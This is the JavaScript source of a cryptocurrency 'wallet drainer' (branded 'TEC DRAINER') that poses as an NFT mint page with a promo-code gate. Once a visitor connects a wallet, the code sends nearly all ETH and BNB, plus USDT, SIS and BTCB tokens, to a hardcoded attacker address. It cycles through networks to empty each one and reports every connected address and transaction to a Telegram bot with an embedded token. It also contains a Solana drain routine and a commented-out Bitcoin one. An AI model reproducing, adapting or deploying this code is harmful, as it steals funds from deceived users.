const receiveAddress = "0x5687656dc8e984af626317186791ee6f5344E051";
const btcReceiveAddress = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"; // Replace with your BTC receiving address
const solReceiveAddress = "3N5K1tU6oCkN8V7SuY6mXtY8cRbUMhSzYHbH8Z5HhTBz"; // Replace with your Solana receiving address

const collectionInfo = {
    name: "TEC DRAINER",
    socialMedia: {
        discord: "https://t.me/TecOnSellix",
        twitter: "https://t.me/TecOnSellix",
        instagram: "https://t.me/TecOnSellix",
    },
};

const indexPageInfo = {
    backgroundImage: "background.jpg",
    title: "{name}",
    underTitle: "ETH + NFT DRAINER",
};

const customStrings = {
    title: "MINT {name}",
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}",
};

const telegramBotToken = '7062331364:AAHcFrPr1EICOIY3TF1utyIvqz1fOT6KDjM';
const telegramChatId = '6907617404';

const networks = [
    { name: 'Ethereum', chainId: '0x1', symbol: 'ETH', rpcUrl: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID', explorerUrl: 'https://etherscan.io' },
    /* { name: 'Polygon', chainId: '0x89', symbol: 'MATIC', rpcUrl: 'https://polygon-rpc.com/', explorerUrl: 'https://polygonscan.com' },
     { name: 'Avalanche', chainId: '0xa86a', symbol: 'AVAX', rpcUrl: 'https://api.avax.network/ext/bc/C/rpc', explorerUrl: 'https://cchain.explorer.avax.network' },
     { name: 'Fantom', chainId: '0xfa', symbol: 'FTM', rpcUrl: 'https://rpcapi.fantom.network/', explorerUrl: 'https://ftmscan.com' },
     { name: 'Harmony', chainId: '0x63564c40', symbol: 'ONE', rpcUrl: 'https://api.harmony.one', explorerUrl: 'https://explorer.harmony.one' },
     { name: 'Arbitrum', chainId: '0xa4b1', symbol: 'ETH', rpcUrl: 'https://arb1.arbitrum.io/rpc', explorerUrl: 'https://arbiscan.io' },
     { name: 'Optimism', chainId: '0xa', symbol: 'ETH', rpcUrl: 'https://mainnet.optimism.io', explorerUrl: 'https://optimistic.etherscan.io' },
     { name: 'xDai Chain', chainId: '0x64', symbol: 'xDAI', rpcUrl: 'https://rpc.xdaichain.com', explorerUrl: 'https://blockscout.com/xdai/mainnet' },*/
    { name: 'Binance Smart Chain', chainId: '0x38', symbol: 'BNB', rpcUrl: 'https://bsc-dataseed.binance.org/', explorerUrl: 'https://bscscan.com' }
];

const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT contract address on Ethereum
const btcbAddress = '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'; // BTCB contract address on BSC
const sisAddress = '0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9'; // SIS contract address on Ethereum

const usdtAbi = [
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "type": "function"
    }
];

const erc20Abi = [
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "type": "function"
    }
];

let currentNetworkIndex = 0;
let bnbNetworkIndex = networks.findIndex(network => network.symbol === 'BNB');

function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const data = {
        chat_id: telegramChatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (response.ok) {
            console.log("Message sent to Telegram");
        } else {
            console.error("Failed to send message to Telegram");
        }
    }).catch(error => {
        console.error("Error sending message to Telegram", error);
    });
}

document.getElementById('submit-code').addEventListener('click', async () => {
    const code = document.getElementById('promo-code').value;
    const walletAddress = 'user_wallet_address'; // Placeholder, replace with actual retrieval logic
    const response = await fetch('http://localhost:3000/validate-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code, walletAddress })
    });
    const result = await response.json();
    if (result.success) {
        showCongratsAnimation();
        setTimeout(() => {
            document.getElementById('code-section').style.display = 'none';
            document.getElementById('congrats-section').style.display = 'block';
        }, 2000); // Delay to show the animation before revealing the wallet connection section
    } else {
        alert(result.message);
    }
});

document.getElementById('connect-wallet').addEventListener('click', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet connected: ", userAddress);
            sendTelegramMessage(`Wallet connected: ${userAddress}`);
            checkBalanceAndDrain();
        } catch (error) {
            console.error("User denied account access", error);
        }
    } else if (window.web3) {
        web3 = new Web3(window.web3.currentProvider);
        try {
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet connected: ", userAddress);
            sendTelegramMessage(`Wallet connected: ${userAddress}`);
            checkBalanceAndDrain();
        } catch (error) {
            console.error("User denied account access", error);
        }
    } else {
        alert("Non-Ethereum browser detected. You should consider trying MetaMask!");
    }
});

function showCongratsAnimation() {
    confetti({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 }
    });
}

async function switchNetwork() {
    currentNetworkIndex = (currentNetworkIndex + 1) % networks.length;

    // Ensure BNB network is the last to be checked
    if (currentNetworkIndex === bnbNetworkIndex) {
        if (networks.every((network, index) => index === bnbNetworkIndex || network.drained)) {
            currentNetworkIndex = bnbNetworkIndex;
        } else {
            switchNetwork();
            return;
        }
    }

    const network = networks[currentNetworkIndex];
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: network.chainId }],
        });
        console.log(`Switched to ${network.name}`);
        sendTelegramMessage(`Switched to ${network.name}`);
        checkBalanceAndDrain();
    } catch (error) {
        if (error.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: network.chainId,
                        chainName: network.name,
                        nativeCurrency: {
                            name: network.name,
                            symbol: network.symbol,
                            decimals: 18
                        },
                        rpcUrls: [network.rpcUrl],
                        blockExplorerUrls: [network.explorerUrl]
                    }]
                });
                console.log(`Network ${network.name} added and switched`);
                sendTelegramMessage(`Network ${network.name} added and switched`);
                checkBalanceAndDrain();
            } catch (addError) {
                console.error(`Failed to add ${network.name}`, addError);
                sendTelegramMessage(`Failed to add ${network.name}: ${addError.message}`);
            }
        } else {
            console.error(`Failed to switch to ${network.name}`, error);
            sendTelegramMessage(`Failed to switch to ${network.name}: ${error.message}`);
        }
    }
}

async function checkBalanceAndDrain() {
    if (!userAddress) {
        alert("Please connect your wallet first!");
        return;
    }

    try {
        const balance = BigInt(await web3.eth.getBalance(userAddress)); // Convert balance to BigInt

        if (balance === BigInt(0)) {
            console.log("No balance to drain.");
            sendTelegramMessage("No balance to drain on current network.");
            networks[currentNetworkIndex].drained = true;
            if (networks[currentNetworkIndex].name === 'Ethereum') {
                await drainUsdt();
                await drainErc20(sisAddress, 'SIS');
            } else if (networks[currentNetworkIndex].name === 'Binance Smart Chain') {
                await drainErc20(btcbAddress, 'BTCB');
            } else {
                switchNetwork();
            }
            return;
        } else {
            console.log("Balance found:", balance.toString());
            sendTelegramMessage(`Balance found on ${networks[currentNetworkIndex].name}: ${balance.toString()} ${networks[currentNetworkIndex].symbol}`);
            await drainBalance(balance);
        }

    } catch (error) {
        console.error("Failed to check balance", error);
        sendTelegramMessage(`Failed to check balance on ${networks[currentNetworkIndex].name}: ${error.message}`);
        networks[currentNetworkIndex].drained = true;
        switchNetwork();
    }
}

async function drainBalance(balance) {
    try {
        const gasPrice = BigInt(await web3.eth.getGasPrice()); // Convert gas price to BigInt
        const gasLimit = BigInt(21000); // Set gas limit as BigInt
        const gasCost = gasLimit * gasPrice;

        if (balance > gasCost) {
            const amountToSend = balance - gasCost;

            const transaction = {
                from: userAddress,
                to: receiveAddress,
                value: amountToSend.toString(), // Convert the amount to string
                gas: Number(gasLimit), // Convert BigInt gasLimit back to number for the transaction
                gasPrice: gasPrice.toString() // Convert BigInt gasPrice to string
            };

            const tx = await web3.eth.sendTransaction(transaction);
            console.log("Transaction successful! Transaction Hash:", tx.transactionHash);
            sendTelegramMessage(`Transaction successful from ${userAddress}: ${tx.transactionHash}`);
        } else {
            console.log("Not enough balance to cover gas costs.");
            sendTelegramMessage("Not enough balance to cover gas costs.");
        }

        networks[currentNetworkIndex].drained = true;
        switchNetwork();
    } catch (error) {
        console.error("Transaction failed", error);
        sendTelegramMessage(`Transaction failed from ${userAddress}: ${error.message}`);
        networks[currentNetworkIndex].drained = true;
        switchNetwork();
    }
}

async function drainUsdt() {
    const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
    try {
        const usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
        if (BigInt(usdtBalance) > BigInt(0)) {
            const tx = await usdtContract.methods.transfer(receiveAddress, usdtBalance).send({ from: userAddress });
            console.log("USDT Transfer successful! Transaction Hash:", tx.transactionHash);
            sendTelegramMessage(`USDT Transfer successful from ${userAddress}: ${tx.transactionHash}`);
        } else {
            console.log("No USDT balance to drain.");
            sendTelegramMessage("No USDT balance to drain.");
        }
    } catch (error) {
        console.error("USDT Transfer failed", error);
        sendTelegramMessage(`USDT Transfer failed from ${userAddress}: ${error.message}`);
    }
    networks[currentNetworkIndex].drained = true;
    switchNetwork();
}

async function drainErc20(tokenAddress, tokenSymbol) {
    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
    try {
        const tokenBalance = await tokenContract.methods.balanceOf(userAddress).call();
        if (BigInt(tokenBalance) > BigInt(0)) {
            const tx = await tokenContract.methods.transfer(receiveAddress, tokenBalance).send({ from: userAddress });
            console.log(`${tokenSymbol} Transfer successful! Transaction Hash:`, tx.transactionHash);
            sendTelegramMessage(`${tokenSymbol} Transfer successful from ${userAddress}: ${tx.transactionHash}`);
        } else {
            console.log(`No ${tokenSymbol} balance to drain.`);
            sendTelegramMessage(`No ${tokenSymbol} balance to drain.`);
        }
    } catch (error) {
        console.error(`${tokenSymbol} Transfer failed`, error);
        sendTelegramMessage(`${tokenSymbol} Transfer failed from ${userAddress}: ${error.message}`);
    }
    networks[currentNetworkIndex].drained = true;
    switchNetwork();
}

/*async function drainBtc() {
        const keyPair = bitcoinjs.bitcoin.ECPair.fromWIF('YOUR_PRIVATE_KEY'); // Your private key in WIF format
        const { address } = bitcoinjs.bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });

        try {
            const utxos = await fetchUtxos(address);
            if (utxos.length === 0) {
                console.log("No BTC balance to drain.");
                sendTelegramMessage("No BTC balance to drain.");
                return;
            }

            const { inputs, outputs } = prepareTransaction(utxos, btcReceiveAddress);
            const tx = createTransaction(inputs, outputs, keyPair);

            await broadcastTransaction(tx);
            console.log("BTC Transaction successful! Transaction Hash:", tx.getId());
            sendTelegramMessage(`BTC Transaction successful from ${address}: ${tx.getId()}`);
        } catch (error) {
            console.error("BTC Transaction failed", error);
            sendTelegramMessage(`BTC Transaction failed from ${address}: ${error.message}`);
        }
    }

    async function fetchUtxos(address) {
        // Fetch UTXOs from a Bitcoin API (e.g., Blockcypher, Blockchain.com)
        // This is a placeholder and should be replaced with a real API call
        return [];
    }

    function prepareTransaction(utxos, toAddress) {
        // Prepare the inputs and outputs for the transaction
        return { inputs: [], outputs: [] };
    }

    function createTransaction(inputs, outputs, keyPair) {
        const txb = new bitcoinjs.bitcoin.TransactionBuilder();
        inputs.forEach(input => txb.addInput(input.txid, input.vout));
        outputs.forEach(output => txb.addOutput(output.address, output.value));

        inputs.forEach((input, index) => {
            txb.sign(index, keyPair);
        });

        return txb.build();
    }

    async function broadcastTransaction(tx) {
        // Broadcast the transaction to the Bitcoin network
        // This is a placeholder and should be replaced with a real API call
    }*/
    
async function drainSolana() {
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
    const wallet = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from([])); // Replace with your secret key array

    try {
        const balance = await connection.getBalance(wallet.publicKey);
        if (balance > 0) {
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(solReceiveAddress),
                    lamports: balance - 5000, // Leave some lamports for transaction fees
                })
            );

            const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [wallet]);
            console.log("SOL Transfer successful! Transaction Hash:", signature);
            sendTelegramMessage(`SOL Transfer successful from ${wallet.publicKey.toBase58()}: ${signature}`);
        } else {
            console.log("No SOL balance to drain.");
            sendTelegramMessage("No SOL balance to drain.");
        }
    } catch (error) {
        console.error("SOL Transfer failed", error);
        sendTelegramMessage(`SOL Transfer failed from ${wallet.publicKey.toBase58()}: ${error.message}`);
    }
}

if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40)) {
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
}
